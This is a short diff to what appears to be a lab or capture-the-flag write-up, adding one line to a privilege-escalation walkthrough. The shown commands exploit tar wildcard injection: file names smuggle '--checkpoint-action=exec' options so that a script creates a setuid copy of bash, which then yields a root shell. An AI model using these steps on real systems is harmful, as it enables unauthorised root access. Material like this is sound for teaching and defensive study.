@@ -503,6 +503,7 @@ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > \
 /opt/admin/pwn.sh
 touch /opt/admin/--checkpoint=1
 touch /opt/admin/--checkpoint-action=exec=sh\ pwn.sh
+touch /tmp/backup.tar.gz
 
 /tmp/bash -p
 ```
